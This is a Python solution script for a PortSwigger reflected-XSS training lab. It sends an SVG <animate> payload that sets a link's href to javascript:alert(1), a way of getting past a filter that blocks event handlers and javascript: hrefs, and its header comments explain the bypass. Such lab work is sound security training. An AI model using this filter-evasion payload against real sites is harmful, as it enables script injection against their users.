# Lab 25 — Reflected XSS with event handlers and href attributes blocked
# PortSwigger: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked
#
# Vulnerability: Search — WAF blocks all on* event handlers and href="javascript:..."
# Aim:           Call alert without event handlers or javascript: href
#
# Technique:
#   All on* event attributes are blocked.
#   href="javascript:..." is blocked.
#   Standard injection vectors don't work.
#
#   Use SVG <animate> to SET the href attribute of an <a> tag to javascript:alert(1).
#   Since the href is not written directly — it's animated onto the element —
#   the WAF's static check on href=javascript: doesn't fire:
#
#     <svg>
#       <a>
#         <animate attributeName=href values=javascript:alert(1) />
#         <text x=20 y=20>Click me</text>
#       </a>
#     </svg>
#
#   <animate> changes the href attribute over time → clicking the text
#   executes the animated href value.
#
# ⚠  Requires a click — this is interaction-dependent XSS.
#
# Usage: python xss_lab25.py <url>

import sys
import urllib3
from proxies import proxies
from xss_utils import banner, section, make_session, check_reflection

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PAYLOAD = "<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a></svg>"

if __name__ == "__main__":
    banner()
    section("LAB 25 — REFLECTED XSS: EVENT HANDLERS + href BLOCKED (SVG animate)")

    if len(sys.argv) != 2:
        print("  Usage: python xss_lab25.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    print(f"  ➜  Sending SVG animate payload:\n     {PAYLOAD}\n")
    r = session.get(url, params={"search": PAYLOAD})

    check_reflection(r.text, PAYLOAD, "SVG animate href payload")

    print()
    print("  ➜  Open this URL in a browser, then click the 'Click me' text:")
    print(f"     {r.url}")
    print("  ℹ  <animate> sets href at runtime — WAF only checks static values.")
    print("     The href=javascript: check fires on the raw input, not the animated result.")
